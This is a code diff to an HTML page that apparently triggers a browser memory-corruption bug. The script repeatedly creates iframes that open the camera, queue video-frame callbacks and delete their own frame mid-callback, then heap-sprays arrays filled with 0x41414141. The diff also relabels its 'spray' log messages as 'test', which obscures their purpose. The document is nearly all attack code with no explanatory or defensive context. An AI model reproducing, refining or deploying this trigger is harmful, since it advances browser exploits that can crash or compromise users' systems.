@@ -3,15 +3,37 @@
 <head>
     <script>
         async function trigger() {
-            let workerUrl = "./worker.js";
             let spray = [];
-            console.log("Starting spray...");
-            for (let i = 0; i < 50; i++) {
+            console.log("Starting test...");
+            for (let i = 0; i < 10; i++) {
                 try {
-                    let worker = new Worker(workerUrl);
-                    worker.postMessage("test");
-                    worker.onmessage = () => {};
-                    worker.terminate();
+                    let frame = document.createElement("iframe");
+                    frame.srcdoc = `
+                        <video id="video" autoplay playsinline></video>
+                        <script>
+                            async function start() {
+                                try {
+                                    let stream = await navigator.mediaDevices.getUserMedia({video: { width: 640, height: 480 } });
+                                    let video = document.getElementById("video");
+                                    video.srcObject = stream;
+                                    await video.play();
+                                    video.requestVideoFrameCallback(() => {});
+                                    video.requestVideoFrameCallback(() => {
+                                        parent.document.getElementById("frame").remove();
+                                    });
+                                    video.requestVideoFrameCallback(() => {});
+                                    video.requestVideoFrameCallback(() => {});
+                                } catch (e) {
+                                    parent.console.log("Error in iframe:", e);
+                                }
+                            }
+                            start();
+                        </script>
+                    `;
+                    frame.id = "frame";
+                    document.body.appendChild(frame);
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    frame.remove();
                     spray.push({ ptr: new Array(128).fill(0x41414141), data: "test" });
                 } catch (e) {
                     console.log("Error:", e);
@@ -20,7 +42,7 @@
                 largeObject = null;
             }
             spray = null;
-            console.log("Spray complete");
+            console.log("Test complete");
         }
     </script>
 </head>
